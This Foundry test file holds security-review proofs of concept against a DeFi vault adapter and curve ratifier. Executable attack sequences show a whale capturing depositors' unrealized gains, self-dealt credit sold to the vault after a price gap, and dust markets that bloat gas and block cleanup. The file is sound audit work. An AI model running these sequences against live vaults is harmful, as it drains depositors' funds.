// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.34;

import {console2} from "forge-std/console2.sol";
import {Market, Offer} from "@midnight/interfaces/IMidnight.sol";
import {IdLib} from "@midnight/libraries/IdLib.sol";
import {MAX_TICK} from "@midnight/libraries/TickLib.sol";
import {TenorMarketIdLib} from "../../src/libraries/TenorMarketIdLib.sol";
import {
    MidnightAdapterCurveRatifierIntegrationTest
} from "../integration/MidnightAdapterCurveRatifierIntegration.t.sol";

interface IVaultV2Extra {
    function balanceOf(address account) external view returns (uint256);
    function previewRedeem(uint256 shares) external view returns (uint256);
    function redeem(uint256 shares, address receiver, address onBehalf) external returns (uint256);
    function deallocate(address adapter, bytes memory data, uint256 assets) external;
}

interface IMidnightExtra {
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external;
    function withdrawable(bytes32 id) external view returns (uint128);
}

/// @dev Ratifies everything. Stands for any ratifier the attacker's own maker account authorizes.
contract PermissiveRatifier {
    function isRatified(Offer memory, bytes memory, address) external pure returns (bytes32) {
        return keccak256("morpho.midnight.callbackSuccess");
    }
}

/// @notice Proofs of concept (security review, 2026-11-24). Not part of the audited suite.
/// Run with: forge test --match-contract MidnightAdapterCurveRatifierPoC --match-test test_poc -vv
/// @dev Isolation runs each call as its own transaction. VaultV2 accrues interest once per transaction through
/// transient storage, so without it the vault never accrues again after its first call in a test.
/// forge-config: default.isolate = true
contract MidnightAdapterCurveRatifierPoC is MidnightAdapterCurveRatifierIntegrationTest {
    IVaultV2Extra internal vaultExtra;
    IMidnightExtra internal midnightExtra;

    function _extras() internal {
        vaultExtra = IVaultV2Extra(address(vault));
        midnightExtra = IMidnightExtra(address(midnight));
    }

    /// @notice A new depositor captures the unrealized gain of the vault's existing depositors.
    /// The vault holds credit bought at about 6%. Rates fall and the allocator re-quotes at 1% (sell) and 2% (buy).
    /// The sell cap min(curve, netRate) is the curve, so the credit sells above its book value and the gain is
    /// realized at once. A whale deposits first, round-trips the position, waits for maxRate to distribute the
    /// gain, and leaves with most of it. What it takes is the future interest of the depositors who were there.
    function test_poc_newDepositorCapturesUnrealizedGain() public {
        _extras();
        Market memory market = _market();
        address whale = makeAddr("whale");
        address trader = makeAddr("trader");
        uint256 units = 200_000e18;

        _borrowerTakesBuy(_buyTick(), units);
        vm.prank(allocator);
        ratifier.setCurve(address(adapter), TenorMarketIdLib.toTenorMarketId(market), _curve(1, 2, 1, 2), allocator);

        // Counterfactual: what the existing depositor's shares are worth at maturity when nothing happens.
        uint256 snapshot = vm.snapshotState();
        vm.warp(market.maturity);
        uint256 honestValue = vaultExtra.previewRedeem(vaultExtra.balanceOf(depositor));
        vm.revertToState(snapshot);

        // 1. The whale deposits nine times the vault, at the book share price.
        uint256 whaleDeposit = 9 * DEPOSIT;
        loanToken.mint(whale, whaleDeposit);
        vm.startPrank(whale);
        loanToken.approve(address(vault), whaleDeposit);
        vault.deposit(whaleDeposit, whale);
        vm.stopPrank();

        // 2. Round trip through the ratifier: buy the adapter's credit at the 1% price, sell it back at the 2% price.
        loanToken.mint(trader, units);
        uint256 traderBefore = loanToken.balanceOf(trader);
        uint256 realAssetsBefore = adapter.realAssets() + loanToken.balanceOf(address(vault));
        vm.startPrank(trader);
        loanToken.approve(address(midnight), type(uint256).max);
        midnight.take(_sellOffer(_sellTick()), _ratifierData(), units, trader, address(0), address(0), "");
        midnight.take(_buyOffer(_buyTick()), _ratifierData(), units, trader, trader, address(0), "");
        vm.stopPrank();
        uint256 roundTripCost = traderBefore - loanToken.balanceOf(trader);
        uint256 realizedGain = adapter.realAssets() + loanToken.balanceOf(address(vault)) - realAssetsBefore;

        // 3. One day later the vault has distributed the gain (maxRate is 100% APR here). The whale leaves.
        vm.warp(block.timestamp + 1 days);
        uint256 whaleShares = vaultExtra.balanceOf(whale);
        vm.prank(whale);
        uint256 whaleOut = vaultExtra.redeem(whaleShares, whale, whale);

        vm.warp(market.maturity);
        uint256 attackedValue = vaultExtra.previewRedeem(vaultExtra.balanceOf(depositor));

        console2.log("gain realized by the round trip      ", realizedGain / 1e18);
        console2.log("round trip cost (paid to the vault)  ", roundTripCost / 1e18);
        console2.log("whale profit, net of the round trip  ", (whaleOut - whaleDeposit - roundTripCost) / 1e18);
        console2.log("existing depositor at maturity, honest", honestValue / 1e18);
        console2.log("existing depositor at maturity, attack", attackedValue / 1e18);

        assertGt(realizedGain, 4 * roundTripCost, "the gain is mostly a revaluation, not cash");
        assertGt(whaleOut, whaleDeposit + roundTripCost, "whale did not profit");
        assertLt(attackedValue, honestValue, "existing depositor did not lose");
    }

    /// @notice STANDING CONSENT, sharper than `testPendingBadDebtCanBeSoldToTheAdapter`: the vault has never lent in
    /// the market, the lender and the borrower are the same party, and the position costs nothing to hold.
    /// The attacker lends to itself at the maximum LTV in a market the curve quotes and waits. When the collateral
    /// gaps down, it sells the credit to the vault at the curve price before the bad debt is realized: Midnight's
    /// health check is on the seller, who has no debt. The vault ends up having lent against an underwater position.
    function test_poc_selfDealtCreditSoldToTheVaultAfterAGap() public {
        _extras();
        Market memory market = _market();
        address attackerBorrower = makeAddr("attackerBorrower");
        address attackerLender = makeAddr("attackerLender");
        uint256 units = 400_000e18;
        assertEq(adapter.marketIdsLength(), 0, "the vault holds no market");

        // 1. Self-loan at par between the attacker's two accounts, at the maximum LTV (lltv is 1 in this fixture).
        PermissiveRatifier permissive = new PermissiveRatifier();
        _supplyCollateral(attackerBorrower, market, units);
        vm.prank(attackerBorrower);
        midnightExtra.setIsAuthorized(address(permissive), true, attackerBorrower);
        Offer memory selfLoan;
        selfLoan.market = market;
        selfLoan.maker = attackerBorrower;
        selfLoan.expiry = type(uint256).max;
        selfLoan.tick = MAX_TICK;
        selfLoan.ratifier = address(permissive);
        selfLoan.receiverIfMakerIsSeller = attackerBorrower;
        selfLoan.maxUnits = uint128(units);
        selfLoan.continuousFeeCap = type(uint256).max;
        loanToken.mint(attackerLender, units);
        vm.startPrank(attackerLender);
        loanToken.approve(address(midnight), type(uint256).max);
        midnight.take(selfLoan, "", units, attackerLender, address(0), address(0), "");
        vm.stopPrank();
        assertEq(loanToken.balanceOf(attackerBorrower), units, "the attacker's cash only changed account");

        // 2. The collateral gaps down by 20%. Nothing is liquidated yet, so the loss factor is still zero.
        oracle.setPrice(0.8e36);
        assertEq(midnight.lossFactor(IdLib.toId(market)), 0);

        // 3. The lender account sells all its credit to the vault at the curve price.
        uint256 tick = _buyTick();
        vm.prank(attackerLender);
        (uint256 paidByVault,) =
            midnight.take(_buyOffer(tick), _ratifierData(), units, attackerLender, attackerLender, address(0), "");
        assertEq(loanToken.balanceOf(attackerLender), paidByVault);

        // 4. The bad debt is realized. The vault is the only lender left and bears all of it.
        uint256 bookBefore = adapter.realAssets();
        midnight.liquidate(market, 0, 0, 0, attackerBorrower, false, address(this), address(0), "");
        uint256 vaultLoss = bookBefore - adapter.realAssets();

        console2.log("paid by the vault for the credit ", paidByVault / 1e18);
        console2.log("vault loss once the debt is realized", vaultLoss / 1e18);
        assertApproxEqRel(vaultLoss, paidByVault / 5, 0.001e18, "the vault lost 20% of what it paid");
    }

    /// @notice MATURITY CADENCE: dust opens every cadence maturity the curve quotes, and each one stays in the
    /// adapter's list after maturity until someone liquidates the dust debt and an allocator withdraws it.
    function test_poc_dustOpensEveryCadenceMaturityAndLingers() public {
        _extras();
        uint256 first = ((block.timestamp + 7 days) / 28 days + 1) * 28 days;
        uint256 gasBefore = gasleft();
        vault.totalAssets();
        gasBefore -= gasleft();
        uint256 opened;
        Market memory last;
        for (uint256 maturity = first; maturity <= block.timestamp + 180 days; maturity += 28 days) {
            last = _marketAt(maturity);
            // 2 units for 1 wei of the vault's assets.
            assertEq(_takesBuy(borrower, last, _buyTick(last), 2), 1);
            opened++;
        }
        assertEq(adapter.marketIdsLength(), opened);
        console2.log("markets opened with 1 wei each", opened);
        // Meaningful with `--isolate` only, where each call is its own transaction and storage starts cold.
        uint256 gasAfter = gasleft();
        vault.totalAssets();
        gasAfter -= gasleft();
        console2.log("gas added to each vault accrual, per market", (gasAfter - gasBefore) / opened);

        // Before maturity, anyone can sweep a dust market by buying the dust back through the ratified sell side.
        Market memory swept = _marketAt(first);
        address sweeper = makeAddr("sweeper");
        loanToken.mint(sweeper, 1e18);
        vm.startPrank(sweeper);
        loanToken.approve(address(midnight), type(uint256).max);
        (uint256 sweepCost,) =
            midnight.take(_sellOffer(swept, _sellTick(swept)), _ratifierData(), 2, sweeper, address(0), address(0), "");
        vm.stopPrank();
        console2.log("wei paid to sweep one dust market before maturity", sweepCost);
        opened--;
        assertEq(adapter.marketIdsLength(), opened, "the swept market left the list");

        // After maturity the markets are still listed and still iterated by realAssets.
        vm.warp(last.maturity + 1 days);
        assertEq(adapter.marketIdsLength(), opened);

        // The dust debt is not repaid, so there is nothing to withdraw: the allocator cannot remove the market.
        assertEq(midnightExtra.withdrawable(IdLib.toId(last)), 0);
        vm.prank(allocator);
        vm.expectRevert();
        vaultExtra.deallocate(address(adapter), abi.encode(last), 2);

        // Cleanup takes a liquidation of the dust debt, then a withdrawal, per market.
        loanToken.mint(address(this), 2);
        loanToken.approve(address(midnight), 2);
        midnight.liquidate(last, 0, 0, 2, borrower, true, address(this), address(0), "");
        vm.prank(allocator);
        vaultExtra.deallocate(address(adapter), abi.encode(last), 2);
        assertEq(adapter.marketIdsLength(), opened - 1);
    }

    /// @notice FUNDING: a roll moves the vault's assets only when the funding market has not matured (review of
    /// 2026-11-25). Midnight's continuous fee is on in both markets.
    /// Before maturity, the same buy funded from early repayments realizes a gain at once, which is what
    /// FundingMarketNotMatured prevents. From maturity on, the roll moves the vault's assets exactly as the same buy
    /// funded from idle assets does: by the adapter's rounding of the net rate, and nothing else.
    function test_poc_rollIsValueNeutralOnlyFromMaturity() public {
        Market memory from = _market();
        Market memory next = _marketAt(from.maturity + 28 days);
        midnight.setFeeSetter(address(this));
        midnight.setMarketContinuousFee(IdLib.toId(from), uint256(0.01e18) / YEAR);
        _supplyCollateral(borrower, next, 400_000e18);
        midnight.setMarketContinuousFee(IdLib.toId(next), uint256(0.01e18) / YEAR);

        _borrowerTakesBuy(_buyTick(), 100_000e18);
        loanToken.mint(borrower, 100_000e18);
        vm.prank(borrower);
        loanToken.approve(address(midnight), type(uint256).max);

        // 1. Thirty days in, the borrower repays 40% early. An allocator pinned the unmatured market as a source.
        vm.warp(block.timestamp + 30 days);
        vm.prank(borrower);
        midnight.repay(from, 40_000e18, borrower, address(0), "");
        Offer memory roll = _buyOffer(next, _buyTick(next));
        roll.callbackData = abi.encode(address(adapter), abi.encode(from));
        vm.prank(allocator);
        ratifier.setIsFundingSource(address(adapter), roll.callbackData, true, allocator);

        uint256 assetsBefore = adapter.realAssets() + loanToken.balanceOf(address(vault));
        vm.prank(borrower);
        (uint256 rolledEarly,) = midnight.take(roll, _ratifierData(), 30_000e18, borrower, borrower, address(0), "");
        uint256 gain = adapter.realAssets() + loanToken.balanceOf(address(vault)) - assetsBefore;
        console2.log("assets rolled before maturity      ", rolledEarly / 1e18);
        console2.log("gain realized at once (1e-18)      ", gain);
        assertGt(gain, rolledEarly / 200, "an early roll realizes more than 0.5% of its size");

        // 2. From maturity on, with only the rolling flag.
        vm.prank(allocator);
        ratifier.setIsFundingSource(address(adapter), roll.callbackData, false, allocator);
        vm.warp(from.maturity);
        vm.prank(borrower);
        midnight.repay(from, 60_000e18, borrower, address(0), "");
        vm.prank(allocator);
        ratifier.setAllowsRolling(address(adapter), true, allocator);

        roll = _buyOffer(next, _buyTick(next));
        assetsBefore = adapter.realAssets() + loanToken.balanceOf(address(vault));

        // Reference: the same buy funded from idle assets.
        uint256 snapshot = vm.snapshotState();
        vm.prank(borrower);
        midnight.take(roll, _ratifierData(), 50_000e18, borrower, borrower, address(0), "");
        uint256 idleFundedChange = adapter.realAssets() + loanToken.balanceOf(address(vault)) - assetsBefore;
        vm.revertToState(snapshot);

        roll.callbackData = abi.encode(address(adapter), abi.encode(from));
        uint256 idle = loanToken.balanceOf(address(vault));
        vm.prank(borrower);
        (uint256 rolled,) = midnight.take(roll, _ratifierData(), 50_000e18, borrower, borrower, address(0), "");
        uint256 rolledChange = adapter.realAssets() + loanToken.balanceOf(address(vault)) - assetsBefore;
        console2.log("assets rolled at maturity          ", rolled / 1e18);
        console2.log("change, funded from idle (1e-18)   ", idleFundedChange);
        console2.log("change, rolled (1e-18)             ", rolledChange);
        assertEq(loanToken.balanceOf(address(vault)), idle, "the roll used idle assets");
        assertApproxEqAbs(rolledChange, idleFundedChange, 2, "a roll from a matured market moved the vault's assets");
        assertLt(rolledChange, 1e12, "more than rate rounding");
    }
}
